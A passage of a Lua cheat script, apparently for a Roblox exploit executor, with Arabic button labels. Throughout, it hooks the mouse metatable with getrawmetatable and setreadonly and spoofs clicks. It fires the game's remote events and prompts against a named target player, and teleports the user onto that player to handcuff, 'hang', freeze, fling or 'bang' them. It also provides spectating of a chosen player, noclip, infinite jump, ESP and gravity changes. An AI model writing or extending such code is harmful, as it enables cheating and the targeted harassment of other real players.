    msgLbl.Size                 = UDim2.new(1, -28, 0, 18)
    msgLbl.Position             = UDim2.new(0, 20, 0, 34)
    msgLbl.BackgroundTransparency = 1
    msgLbl.Text                 = msg
    msgLbl.TextColor3           = Color3.fromRGB(170, 170, 170)
    msgLbl.TextXAlignment       = Enum.TextXAlignment.Right
    msgLbl.Font                 = Enum.Font.Gotham
    msgLbl.TextSize             = 12
    msgLbl.ZIndex               = 11
    msgLbl.Parent               = toast
    TweenService:Create(toast,
        TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
        { Position = UDim2.new(1, -16, 1, -24) }
    ):Play()
    task.delay(7.0, function()
        local fadeOut = TweenService:Create(toast,
            TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Position = UDim2.new(1, 270, 1, -24), BackgroundTransparency = 1 }
        )
        TweenService:Create(titleLbl,  TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
        TweenService:Create(msgLbl,    TweenInfo.new(0.4), { TextTransparency = 1 }):Play()
        TweenService:Create(accentBar, TweenInfo.new(0.4), { BackgroundTransparency = 1 }):Play()
        TweenService:Create(_ts,       TweenInfo.new(0.4), { Transparency = 1 }):Play()
        fadeOut:Play()
        fadeOut.Completed:Connect(function()
            pcall(function() toastGui:Destroy() end)
        end)
    end)
end

_T18TargetSavedName = ""

_t18AutoBang = false

Players.PlayerRemoving:Connect(function(player)
    local inputText = Input and Input.Text or ""
    if inputText ~= "" and player.Name:lower() == inputText:lower() then
        _T18TargetSavedName = Input.Text

        _t18AutoBang = isActive
        if isActive then stopBang() end
        Input.Text = ""
        T18ShowPlayerToast("خرج اللاعب: " .. player.Name)
    end
end)

Players.PlayerAdded:Connect(function(player)
    if _T18TargetSavedName ~= "" and player.Name:lower() == _T18TargetSavedName:lower() then
        if Input and Input.Text == "" then
            Input.Text = _T18TargetSavedName
            _T18TargetSavedName = ""
            T18ShowPlayerToast("دخل اللاعب من جديد: " .. player.Name)

            if _t18AutoBang then
                _t18AutoBang = false
                task.spawn(function()

                    local tries = 0
                    repeat
                        task.wait(0.4)
                        tries = tries + 1
                    until (player.Character and player.Character:FindFirstChild("HumanoidRootPart")) or tries > 15
                    if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                        startBang(player)
                    end
                end)
            end
        end
    end
end)

function hangFindCuffTool()
    local containers = {}
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local ch = LocalPlayer.Character
    if bp then table.insert(containers, bp) end
    if ch then table.insert(containers, ch) end
    for _, cont in ipairs(containers) do
        for _, item in ipairs(cont:GetChildren()) do
            if item:IsA("Tool") then
                local n = item.Name
                if (#n >= 3 and n:sub(1,3) == _Hang.prefix) or n:find(_Hang.prefix) then
                    return item
                end
            end
        end
    end
    return nil
end

function hangCleanup(returnHome)
    _Hang.running = false
    if _Hang.activConn then _Hang.activConn:Disconnect() _Hang.activConn = nil end
    if _Hang.remConn  then _Hang.remConn:Disconnect()  _Hang.remConn  = nil end
    pcall(function()
        local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
        if hum then hum:UnequipTools() end
    end)
    if returnHome and _Hang.savedCF then
        local cf = _Hang.savedCF
        task.spawn(function()
            task.wait(0.1)
            for _ = 1, 6 do
                local c = LocalPlayer.Character
                local r = c and c:FindFirstChild("HumanoidRootPart")
                if r then r.CFrame = cf end
                RunService.Heartbeat:Wait()
            end
        end)
    end
    _Hang.savedCF = nil
end

function hangAutoCuff(cuff, bodyPart)
    local origCamType = workspace.CurrentCamera.CameraType
    local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    pcall(function()
        workspace.CurrentCamera.CameraType = Enum.CameraType.Scriptable
        local dir = (bodyPart.Position - myRoot.Position).Unit
        workspace.CurrentCamera.CFrame = CFrame.lookAt(
            bodyPart.Position - dir * 3 + Vector3.new(0, 0.5, 0),
            bodyPart.Position
        )
    end)
    task.wait(0.04)
    local cam = workspace.CurrentCamera
    local vp  = cam.ViewportSize
    local sp, vis = cam:WorldToScreenPoint(bodyPart.Position)
    local tx = (vis and sp.Z > 0) and sp.X or (vp.X / 2)
    local ty = (vis and sp.Z > 0) and sp.Y or (vp.Y / 2)
    local mouse = LocalPlayer:GetMouse()
    local mt, orig, hooked = nil, nil, false
    pcall(function()
        mt   = getrawmetatable(mouse)
        orig = mt.__index
        setreadonly(mt, false)
        mt.__index = function(self, key)
            if key == "Target" then return bodyPart end
            if key == "Hit"    then return CFrame.new(bodyPart.Position) end
            if type(orig) == "function" then return orig(self, key) end
            return orig[key]
        end
        setreadonly(mt, true)
        hooked = true
    end)
    pcall(function()
        if mousemoveabs then mousemoveabs(tx, ty) end
        if mouse1click then mouse1click()
        elseif mouse1press then mouse1press() task.wait(0.03) mouse1release() end
    end)
    task.wait(0.04)
    pcall(function()
        local vim = game:GetService("VirtualInputManager")
        vim:SendMouseButtonEvent(tx, ty, 0, true,  game, 1)
        task.wait(0.03)
        vim:SendMouseButtonEvent(tx, ty, 0, false, game, 1)
    end)
    task.wait(0.05)
    pcall(function() workspace.CurrentCamera.CameraType = origCamType end)
    if hooked and mt and orig then
        pcall(function()
            setreadonly(mt, false)
            mt.__index = orig
            setreadonly(mt, true)
        end)
    end
end

function doHangAuto(targetPlayer)
    if _Hang.running then return end
    local cuff = hangFindCuffTool()
    if not cuff then
        pcall(function()
            showNotification(T18T("ما عندك كلبشة!"))
        end)
        return
    end
    local myChar = LocalPlayer.Character
    local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
    local tgChar = targetPlayer.Character
    local tgRoot = tgChar and tgChar:FindFirstChild("HumanoidRootPart")
    if not myRoot or not tgRoot then return end

    _Hang.running    = true
    _Hang.savedCF = myRoot.CFrame

    myRoot.CFrame = tgRoot.CFrame * CFrame.new(0, 0, 2.8)
    task.wait(0.05)

    local myHum = myChar:FindFirstChildOfClass("Humanoid")
    if myHum then pcall(function() myHum:EquipTool(cuff) end) end
    task.wait(0.1)

    local bodyPart = tgChar:FindFirstChild("UpperTorso")
                  or tgChar:FindFirstChild("Torso")
                  or tgRoot

    _Hang.activConn = cuff.Activated:Connect(function()
        if not _Hang.running then return end
        if _Hang.activConn then _Hang.activConn:Disconnect() _Hang.activConn = nil end
        task.wait(0.08)
        local c2 = LocalPlayer.Character
        local r2 = c2 and c2:FindFirstChild("HumanoidRootPart")
        if not r2 then hangCleanup(false) return end
        local homePos = _Hang.savedCF
        r2.CFrame = CFrame.new(_Hang.flingPos)
        task.wait(0.25)
        hdRunCommand(hdPrefix() .. _Hang.cmd)
        task.wait(0.4)
        local c3 = LocalPlayer.Character
        local r3 = c3 and c3:FindFirstChild("HumanoidRootPart")
        if r3 and homePos then
            for _ = 1, 6 do r3.CFrame = homePos RunService.Heartbeat:Wait() end
        end
        task.wait(0.6)
        hdRunCommand(hdPrefix() .. _Hang.cmd .. " " .. LocalPlayer.Name)
        pcall(function()
            showNotification(T18T("تم التعليق!"))
        end)
        hangCleanup(false)
    end)

    _Hang.remConn = Players.PlayerRemoving:Connect(function(p)
        if p == targetPlayer and _Hang.running then
            hangCleanup(true)
        end
    end)

    task.spawn(function()
        hangAutoCuff(cuff, bodyPart)
        task.wait(5)
        if _Hang.running then
            pcall(function()
                showNotification(T18T("فشلت الكلبشة، حاول مجدداً"))
            end)
            hangCleanup(true)
        end
    end)
end

_Hang.cuffBtn.MouseButton1Click:Connect(function()
    local target = findTargetPlayer()
    if not target then
        pcall(function()
            showNotification(T18T("ما لقيت اللاعب، تاكد من الاسم"))
        end)
        return
    end
    local tgChar = target.Character
    if not tgChar then return end
    local tgRoot = tgChar:FindFirstChild("HumanoidRootPart")
    if not tgRoot then return end
    local cuff = hangFindCuffTool()
    if not cuff then
        pcall(function()
            showNotification(T18T("ما عندك كلبشة!"))
        end)
        return
    end
    task.spawn(function()
        local myChar = LocalPlayer.Character
        local myHum  = myChar and myChar:FindFirstChildOfClass("Humanoid")
        if myHum then pcall(function() myHum:EquipTool(cuff) end) end
        task.wait(0.1)
        local bodyPart = tgChar:FindFirstChild("UpperTorso") or tgChar:FindFirstChild("Torso") or tgRoot
        local done = false

        if not done then
            pcall(function()
                for _, v in ipairs(tgChar:GetDescendants()) do
                    if v:IsA("ProximityPrompt") then
                        fireproximityprompt(v)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            pcall(function()
                for _, v in ipairs(tgChar:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            pcall(function()
                for _, v in ipairs(cuff:GetDescendants()) do
                    if v:IsA("RemoteEvent") then
                        v:FireServer(bodyPart)
                        done = true
                        break
                    elseif v:IsA("RemoteFunction") then
                        v:InvokeServer(bodyPart)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            local cam = workspace.CurrentCamera
            local vp  = cam.ViewportSize
            local sp, vis = cam:WorldToScreenPoint(bodyPart.Position)
            local tx = (vis and sp.Z > 0) and sp.X or (vp.X / 2)
            local ty = (vis and sp.Z > 0) and sp.Y or (vp.Y / 2)
            local mouse = LocalPlayer:GetMouse()
            local mt, orig, hooked = nil, nil, false
            pcall(function()
                mt   = getrawmetatable(mouse)
                orig = mt.__index
                setreadonly(mt, false)
                mt.__index = function(self, key)
                    if key == "Target" then return bodyPart end
                    if key == "Hit"    then return CFrame.new(bodyPart.Position) end
                    if type(orig) == "function" then return orig(self, key) end
                    return orig[key]
                end
                setreadonly(mt, true)
                hooked = true
            end)
            pcall(function()
                if mousemoveabs then mousemoveabs(tx, ty) end
                if mouse1click then mouse1click()
                elseif mouse1press then mouse1press() task.wait(0.03) mouse1release() end
            end)
            task.wait(0.04)
            pcall(function()
                local vim = game:GetService("VirtualInputManager")
                vim:SendMouseButtonEvent(tx, ty, 0, true,  game, 1)
                task.wait(0.03)
                vim:SendMouseButtonEvent(tx, ty, 0, false, game, 1)
            end)
            if hooked and mt and orig then
                pcall(function()
                    setreadonly(mt, false)
                    mt.__index = orig
                    setreadonly(mt, true)
                end)
            end
        end
    end)
end)

_Hang.pullBtn.MouseButton1Click:Connect(function()
    local target = findTargetPlayer()
    if not target then
        pcall(function()
            showNotification(T18T("ما لقيت اللاعب، تاكد من الاسم"))
        end)
        return
    end
    local tgChar = target.Character
    if not tgChar then return end
    local tgRoot = tgChar:FindFirstChild("HumanoidRootPart")
    if not tgRoot then return end
    local cuff = hangFindCuffTool()
    if not cuff then
        pcall(function()
            showNotification(T18T("ما عندك كلبشة!"))
        end)
        return
    end
    task.spawn(function()
        local myChar = LocalPlayer.Character
        local myHum  = myChar and myChar:FindFirstChildOfClass("Humanoid")
        if myHum then pcall(function() myHum:EquipTool(cuff) end) end
        task.wait(0.1)
        local bodyPart = tgChar:FindFirstChild("UpperTorso") or tgChar:FindFirstChild("Torso") or tgRoot
        local done = false

        if not done then
            pcall(function()
                for _, v in ipairs(tgChar:GetDescendants()) do
                    if v:IsA("ProximityPrompt") then
                        fireproximityprompt(v)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            pcall(function()
                for _, v in ipairs(tgChar:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            pcall(function()
                for _, v in ipairs(cuff:GetDescendants()) do
                    if v:IsA("RemoteEvent") then
                        v:FireServer(bodyPart)
                        done = true
                        break
                    elseif v:IsA("RemoteFunction") then
                        v:InvokeServer(bodyPart)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            local cam = workspace.CurrentCamera
            local vp  = cam.ViewportSize
            local sp, vis = cam:WorldToScreenPoint(bodyPart.Position)
            local tx = (vis and sp.Z > 0) and sp.X or (vp.X / 2)
            local ty = (vis and sp.Z > 0) and sp.Y or (vp.Y / 2)
            local mouse = LocalPlayer:GetMouse()
            local mt, orig, hooked = nil, nil, false
            pcall(function()
                mt   = getrawmetatable(mouse)
                orig = mt.__index
                setreadonly(mt, false)
                mt.__index = function(self, key)
                    if key == "Target" then return bodyPart end
                    if key == "Hit"    then return CFrame.new(bodyPart.Position) end
                    if type(orig) == "function" then return orig(self, key) end
                    return orig[key]
                end
                setreadonly(mt, true)
                hooked = true
            end)
            pcall(function()
                if mousemoveabs then mousemoveabs(tx, ty) end
                if mouse1click then mouse1click()
                elseif mouse1press then mouse1press() task.wait(0.03) mouse1release() end
            end)
            task.wait(0.04)
            pcall(function()
                local vim = game:GetService("VirtualInputManager")
                vim:SendMouseButtonEvent(tx, ty, 0, true,  game, 1)
                task.wait(0.03)
                vim:SendMouseButtonEvent(tx, ty, 0, false, game, 1)
            end)
            if hooked and mt and orig then
                pcall(function()
                    setreadonly(mt, false)
                    mt.__index = orig
                    setreadonly(mt, true)
                end)
            end
        end

        local function doPullClick()
            local cam2 = workspace.CurrentCamera
            local vp2  = cam2.ViewportSize
            local sp2, vis2 = cam2:WorldToScreenPoint(bodyPart.Position)
            local tx2 = (vis2 and sp2.Z > 0) and sp2.X or (vp2.X / 2)
            local ty2 = (vis2 and sp2.Z > 0) and sp2.Y or (vp2.Y / 2)

            if mousemoveabs then mousemoveabs(tx2, ty2) end
            if mouse1click then
                mouse1click()
            elseif mouse1press then
                mouse1press()
                task.wait(0.03)
                mouse1release()
            else
                local vim2 = game:GetService("VirtualInputManager")
                vim2:SendMouseButtonEvent(tx2, ty2, 0, true,  game, 1)
                task.wait(0.03)
                vim2:SendMouseButtonEvent(tx2, ty2, 0, false, game, 1)
            end
        end
        task.wait(0.15)
        for _i = 1, 5 do

            pcall(doPullClick)

            pcall(doPullClick)

            pcall(function()
                local vp3 = workspace.CurrentCamera.ViewportSize
                local cx  = vp3.X / 2
                local cy  = vp3.Y / 2
                if mousemoveabs then mousemoveabs(cx, cy) end
                if mouse1click then
                    mouse1click()
                elseif mouse1press then
                    mouse1press()
                    task.wait(0.03)
                    mouse1release()
                else
                    local vim3 = game:GetService("VirtualInputManager")
                    vim3:SendMouseButtonEvent(cx, cy, 0, true,  game, 1)
                    task.wait(0.03)
                    vim3:SendMouseButtonEvent(cx, cy, 0, false, game, 1)
                end
            end)
        end
    end)
    task.spawn(function()
        task.wait(1.5)
        local _p = game:GetService("UserInputService"):GetMouseLocation()
        if mouse1click then
            mouse1click()
        elseif mouse1press then
            mouse1press() task.wait(0.05) mouse1release()
        else
            local _v = game:GetService("VirtualInputManager")
            _v:SendMouseButtonEvent(_p.X, _p.Y, 0, true,  game, 1)
            task.wait(0.05)
            _v:SendMouseButtonEvent(_p.X, _p.Y, 0, false, game, 1)
        end
    end)
end)

_Hang.freezeBtn.MouseButton1Click:Connect(function()
    local target = findTargetPlayer()
    if not target then
        pcall(function()
            showNotification(T18T("ما لقيت اللاعب، تاكد من الاسم"))
        end)
        return
    end
    local tgChar = target.Character
    if not tgChar then return end
    local tgRoot = tgChar:FindFirstChild("HumanoidRootPart")
    if not tgRoot then return end
    local cuff = hangFindCuffTool()
    if not cuff then
        pcall(function()
            showNotification(T18T("ما عندك كلبشة!"))
        end)
        return
    end
    task.spawn(function()
        local myChar = LocalPlayer.Character
        local myHum  = myChar and myChar:FindFirstChildOfClass("Humanoid")
        if myHum then pcall(function() myHum:EquipTool(cuff) end) end
        task.wait(0.1)
        local bodyPart = tgChar:FindFirstChild("UpperTorso") or tgChar:FindFirstChild("Torso") or tgRoot
        local done = false

        if not done then
            pcall(function()
                for _, v in ipairs(tgChar:GetDescendants()) do
                    if v:IsA("ProximityPrompt") then
                        fireproximityprompt(v)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            pcall(function()
                for _, v in ipairs(tgChar:GetDescendants()) do
                    if v:IsA("ClickDetector") then
                        fireclickdetector(v)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            pcall(function()
                for _, v in ipairs(cuff:GetDescendants()) do
                    if v:IsA("RemoteEvent") then
                        v:FireServer(bodyPart)
                        done = true
                        break
                    elseif v:IsA("RemoteFunction") then
                        v:InvokeServer(bodyPart)
                        done = true
                        break
                    end
                end
            end)
        end

        if not done then
            local cam = workspace.CurrentCamera
            local vp  = cam.ViewportSize
            local sp, vis = cam:WorldToScreenPoint(bodyPart.Position)
            local tx = (vis and sp.Z > 0) and sp.X or (vp.X / 2)
            local ty = (vis and sp.Z > 0) and sp.Y or (vp.Y / 2)
            local mouse = LocalPlayer:GetMouse()
            local mt, orig, hooked = nil, nil, false
            pcall(function()
                mt   = getrawmetatable(mouse)
                orig = mt.__index
                setreadonly(mt, false)
                mt.__index = function(self, key)
                    if key == "Target" then return bodyPart end
                    if key == "Hit"    then return CFrame.new(bodyPart.Position) end
                    if type(orig) == "function" then return orig(self, key) end
                    return orig[key]
                end
                setreadonly(mt, true)
                hooked = true
            end)
            pcall(function()
                if mousemoveabs then mousemoveabs(tx, ty) end
                if mouse1click then mouse1click()
                elseif mouse1press then mouse1press() task.wait(0.03) mouse1release() end
            end)
            task.wait(0.04)
            pcall(function()
                local vim = game:GetService("VirtualInputManager")
                vim:SendMouseButtonEvent(tx, ty, 0, true,  game, 1)
                task.wait(0.03)
                vim:SendMouseButtonEvent(tx, ty, 0, false, game, 1)
            end)
            if hooked and mt and orig then
                pcall(function()
                    setreadonly(mt, false)
                    mt.__index = orig
                    setreadonly(mt, true)
                end)
            end
        end

        task.wait(0.15)
        hdRunCommand(hdPrefix() .. _Hang.cmd)
        task.wait(0.5)
        hdRunCommand(hdPrefix() .. _Hang.cmd .. " " .. LocalPlayer.Name)
        task.wait(0.2)

        pcall(function()
            local hum = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if hum then hum:UnequipTools() end
        end)
    end)
end)

do
    local newBusy = false

    local function prepare()
        local target = findTargetPlayer()
        if not target then
            pcall(function()
                showNotification(T18T("ما لقيت اللاعب، تاكد من الاسم"))
            end)
            return nil
        end
        local tool = _T18NewCuff.find(_T18NewCuff.nameBox.Text)
        if not tool then
            pcall(function()
                showNotification(T18T("ما لقيت الكلبشة الجديدة، اكتب اسمها بالخانة"))
            end)
            return nil
        end
        local myChar = LocalPlayer.Character
        local myRoot = myChar and myChar:FindFirstChild("HumanoidRootPart")
        local myHum  = myChar and myChar:FindFirstChildOfClass("Humanoid")
        local tgChar = target.Character
        local tgRoot = tgChar and tgChar:FindFirstChild("HumanoidRootPart")
        if not myRoot or not myHum or not tgRoot then return nil end
        return { target = target, tool = tool, myRoot = myRoot, myHum = myHum, tgChar = tgChar, tgRoot = tgRoot }
    end

    local function cuffTarget(ctx)
        local homeCF = ctx.myRoot.CFrame
        pcall(function() ctx.myRoot.CFrame = ctx.tgRoot.CFrame * CFrame.new(0, 0, 2.8) end)
        task.wait(0.05)
        pcall(function() ctx.myHum:EquipTool(ctx.tool) end)
        task.wait(0.15)
        local bodyPart = ctx.tgChar:FindFirstChild("UpperTorso")
                      or ctx.tgChar:FindFirstChild("Torso")
                      or ctx.tgRoot
        local activated = false
        local conn = ctx.tool.Activated:Connect(function() activated = true end)
        pcall(function() _T18NewCuff.click(bodyPart) end)
        local t = tick()
        while not activated and tick() - t < 1.5 do
            task.wait(0.05)
        end
        conn:Disconnect()
        return homeCF
    end

    local function unequip()
        pcall(function()
            local h = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
            if h then h:UnequipTools() end
        end)
    end

    NewHangBtn.MouseButton1Click:Connect(function()
        if newBusy or _Hang.running then return end
        local ctx = prepare()
        if not ctx then return end
        newBusy = true
        NewHangBtn.Text = T18T("جاري التعليق...")
        task.spawn(function()
            pcall(function()
                local homeCF = cuffTarget(ctx)
                task.wait(0.08)
                local r2 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if not r2 then return end
                r2.CFrame = CFrame.new(_Hang.flingPos)
                task.wait(0.35)

                local relPart = ctx.tgChar:FindFirstChild("UpperTorso")
                             or ctx.tgChar:FindFirstChild("Torso")
                             or ctx.tgRoot
                local released = false
                local relConn = ctx.tool.Activated:Connect(function() released = true end)
                pcall(function() _T18NewCuff.click(relPart, true) end)
                local relT = tick()
                while not released and tick() - relT < 1.0 do
                    task.wait(0.05)
                end
                relConn:Disconnect()
                task.wait(0.25)

                local r3 = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                if r3 then
                    for _ = 1, 6 do
                        r3.CFrame = homeCF
                        RunService.Heartbeat:Wait()
                    end
                end
                showNotification(T18T("تم التعليق!"))
            end)
            unequip()
            NewHangBtn.Text = T18T("تعليق جديد")
            newBusy = false
        end)
    end)

    NewFreezeBtn.MouseButton1Click:Connect(function()
        if newBusy then return end
        local ctx = prepare()
        if not ctx then return end
        newBusy = true
        NewFreezeBtn.Text = T18T("جاري التجميد...")
        task.spawn(function()
            pcall(function()
                cuffTarget(ctx)
                task.wait(0.15)
                hdRunCommand(hdPrefix() .. _Hang.cmd)
                task.wait(0.5)
                hdRunCommand(hdPrefix() .. _Hang.cmd .. " " .. LocalPlayer.Name)
                task.wait(0.2)
            end)
            unequip()
            NewFreezeBtn.Text = T18T("تجميد جديد")
            newBusy = false
        end)
    end)
end

HangAutoBtn.MouseButton1Click:Connect(function()
    if _Hang.running then return end
    local target = findTargetPlayer()
    if not target then
        pcall(function()
            showNotification(T18T("ما لقيت اللاعب، تاكد من الاسم"))
        end)
        return
    end
    setButtonState(HangAutoBtn, true, T18T("جاري التعليق..."), T18T("تعليق"), Theme.Active, Theme.PanelSoft)
    doHangAuto(target)
    task.spawn(function()
        while _Hang.running do task.wait(0.3) end
        setButtonState(HangAutoBtn, false, T18T("جاري التعليق..."), T18T("تعليق"), Theme.Active, Theme.PanelSoft)
    end)
end)

TargetFlingBtn.MouseButton1Click:Connect(function()
    if targetFlingActive then
        stopTargetFling(true)
        return
    end

    if isActive then stopBang() end
    if _HeadBang.active then stopHeadBang() end

    local target = findTargetPlayer()
    if target then
        startTargetFling(target)
    else
        warn("Player not found or name is too short")
    end
end)

function restoreMyCamera()
    local camera = workspace.CurrentCamera
    local char = LocalPlayer.Character
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if camera then
        camera.CameraType = OriginalCameraType or Enum.CameraType.Custom
        camera.CameraSubject = hum or OriginalCameraSubject
    end
    OriginalCameraType = nil
    OriginalCameraSubject = nil
end

function clearSpectateLabels(keepWarning)
    if SpectateNameLabel then
        SpectateNameLabel:Destroy()
        SpectateNameLabel = nil
    end
    if SpectateWarningLabel and not keepWarning then
        SpectateWarningLabel:Destroy()
        SpectateWarningLabel = nil
    end
end

function stopSpectate(keepWarning)
    SpectateActive = false
    if SpectateConnection then
        SpectateConnection:Disconnect()
        SpectateConnection = nil
    end
    if SpectatePlayerRemovingConnection then
        SpectatePlayerRemovingConnection:Disconnect()
        SpectatePlayerRemovingConnection = nil
    end
    restoreMyCamera()
    clearSpectateLabels(keepWarning)
    SpectateTarget = nil
    setButtonState(SpectateBtn, false, T18T("الغاء المشاهدة"), T18T("مشاهدة"), Theme.Active, Theme.PanelSoft)
end

function createSpectateLabels(target)
    clearSpectateLabels()

    SpectateNameLabel = Instance.new("TextLabel")
    SpectateNameLabel.Size = UDim2.new(0, 320, 0, 38)
    SpectateNameLabel.Position = UDim2.new(0.5, -160, 0, 16)
    SpectateNameLabel.BackgroundColor3 = Theme.PanelSoft
    SpectateNameLabel.BackgroundTransparency = 0.12
    SpectateNameLabel.TextColor3 = Theme.Text
    SpectateNameLabel.TextScaled = true
    SpectateNameLabel.Font = Enum.Font.GothamBold
    SpectateNameLabel.Text = "مشاهدة: " .. target.Name
    SpectateNameLabel.Parent = ScreenGui
    makeCorner(SpectateNameLabel, 12)
    makeStroke(SpectateNameLabel, Theme.Border, 1, 0.2)

    SpectateWarningLabel = Instance.new("TextLabel")
    SpectateWarningLabel.Size = UDim2.new(0, 360, 0, 42)
    SpectateWarningLabel.Position = UDim2.new(0.5, -180, 0, 62)
    SpectateWarningLabel.BackgroundColor3 = Theme.Danger
    SpectateWarningLabel.BackgroundTransparency = 0.12
    SpectateWarningLabel.TextColor3 = Theme.Text
    SpectateWarningLabel.TextScaled = true
    SpectateWarningLabel.Font = Enum.Font.GothamBold
    SpectateWarningLabel.Text = ""
    SpectateWarningLabel.Visible = false
    SpectateWarningLabel.Parent = ScreenGui
    makeCorner(SpectateWarningLabel, 12)
end

function startSpectate(target)
    if _T18BlockOwner(target) then return end
    if not _t18WaitForTarget(target) then return end

    local targetHumanoid = target.Character:FindFirstChildOfClass("Humanoid")
        or target.Character:WaitForChild("Humanoid", 5)
    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
        or target.Character:WaitForChild("HumanoidRootPart", 5)
    if not targetHumanoid or not targetRoot then
        showNotification(T18T(" تعذّر تحميل شخصية اللاعب"))
        return
    end

    local camera = workspace.CurrentCamera
    if not camera then
        return
    end

    OriginalCameraType = camera.CameraType
    OriginalCameraSubject = camera.CameraSubject

    SpectateActive = true
    SpectateTarget = target
    setButtonState(SpectateBtn, true, T18T("الغاء المشاهدة"), T18T("مشاهدة"), Theme.Active, Theme.PanelSoft)
    createSpectateLabels(target)

    if SpectatePlayerRemovingConnection then
        SpectatePlayerRemovingConnection:Disconnect()
        SpectatePlayerRemovingConnection = nil
    end

    SpectatePlayerRemovingConnection = Players.PlayerRemoving:Connect(function(player)
        if player == target then
            showSpectateWarning("اللاعب خرج من اللعبة")
            task.delay(0.7, function()
                if SpectateTarget == target then
                    stopSpectate(true)
                end
            end)
        end
    end)

    camera.CameraType = Enum.CameraType.Custom
    camera.CameraSubject = targetHumanoid

    SpectateConnection = RunService.RenderStepped:Connect(function()
        if not SpectateActive or not SpectateTarget then
            stopSpectate(true)
            return
        end

        local char = SpectateTarget.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local root = char and char:FindFirstChild("HumanoidRootPart")

        if not Players:FindFirstChild(SpectateTarget.Name) then
            showSpectateWarning("اللاعب خرج من اللعبة")
            stopSpectate(true)
            return
        end

        if not char or not hum or not root or hum.Health <= 0 then

            return
        end

        if SpectateNameLabel then
            SpectateNameLabel.Text = "مشاهدة: " .. SpectateTarget.Name
        end

        local currentCamera = workspace.CurrentCamera
        if currentCamera then
            currentCamera.CameraType = Enum.CameraType.Custom
            currentCamera.CameraSubject = hum
        end
    end)
end

SpectateBtn.MouseButton1Click:Connect(function()
    if SpectateActive then
        stopSpectate()
        return
    end

    local target = findTargetPlayer()
    if target then
        startSpectate(target)
    else
        warn("Player not found or name is too short")
    end
end)

;(function()
    local NoClipActive = false
    local NoClipConnection = nil
    local InfiniteJumpActive = false
    local InfiniteJumpConnection = nil
    local WallClimbActive = false
    local WallClimbConnection = nil
    local ESPActive = false
    local ESPConnections = {}
    local ESPLabels = {}

    local NoClipBtn      = PlayerPage:FindFirstChild("NoClipBtn",      true)
    local InfiniteJumpBtn = PlayerPage:FindFirstChild("InfiniteJumpBtn", true)
    local WallClimbBtn   = PlayerPage:FindFirstChild("WallClimbBtn",   true)
    local ESPBtn         = OthersPage:FindFirstChild("ESPBtn",         true)
    local LowGravBtn     = OthersPage:FindFirstChild("LowGravBtn",     true)

    local function stopNoClip()
        NoClipActive = false
        if NoClipConnection then NoClipConnection:Disconnect(); NoClipConnection = nil end
        pcall(function()
            local char = LocalPlayer.Character
            if char then
                for _, part in pairs(char:GetDescendants()) do
                    if part:IsA("BasePart") then part.CanCollide = true end
                end
            end
        end)
        setButtonState(NoClipBtn, false, T18T("ايقاف اختراق"), T18T("اختراق جدران"), Theme.Active, Theme.ButtonDefault)
    end
    local function startNoClip()
        NoClipActive = true
        setButtonState(NoClipBtn, true, T18T("ايقاف اختراق"), T18T("اختراق جدران"), Theme.Active, Theme.ButtonDefault)
        NoClipConnection = RunService.Stepped:Connect(function()
            if not NoClipActive then return end
            local char = LocalPlayer.Character
            if not char then return end
            for _, part in pairs(char:GetDescendants()) do
                if part:IsA("BasePart") then part.CanCollide = false end
            end
        end)
    end
    if NoClipBtn then
        NoClipBtn.MouseButton1Click:Connect(function()
            if NoClipActive then stopNoClip() else startNoClip() end
        end)
    end
    do
        local LowGravActive = false
        local origGrav = 196.2
        if LowGravBtn then
            LowGravBtn.MouseButton1Click:Connect(function()
                LowGravActive = not LowGravActive
                if LowGravActive then
                    origGrav = workspace.Gravity
                    workspace.Gravity = origGrav * 0.25
                    setButtonState(LowGravBtn, true, T18T("ايقاف الجاذبية"), T18T("جاذبية منخفضة"), Theme.Active, Theme.ButtonOrange)
                else
                    workspace.Gravity = origGrav
                    setButtonState(LowGravBtn, false, T18T("ايقاف الجاذبية"), T18T("جاذبية منخفضة"), Theme.Active, Theme.ButtonOrange)
                end
            end)
        end
    end

    local function stopInfiniteJump()
        InfiniteJumpActive = false
        if InfiniteJumpConnection then InfiniteJumpConnection:Disconnect(); InfiniteJumpConnection = nil end
        setButtonState(InfiniteJumpBtn, false, T18T("ايقاف القفز"), T18T("قفز لا نهائي"), Theme.Active, Theme.ButtonDefault)
    end
    local function startInfiniteJump()
        InfiniteJumpActive = true
        setButtonState(InfiniteJumpBtn, true, T18T("ايقاف القفز"), T18T("قفز لا نهائي"), Theme.Active, Theme.ButtonDefault)
        InfiniteJumpConnection = UserInputService.JumpRequest:Connect(function()
            if not InfiniteJumpActive then return end
            local char = LocalPlayer.Character
            if not char then return end
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
        end)
    end
    if InfiniteJumpBtn then
        InfiniteJumpBtn.MouseButton1Click:Connect(function()
            if InfiniteJumpActive then stopInfiniteJump() else startInfiniteJump() end
        end)
    end

    local function stopWallClimb()
        WallClimbActive = false
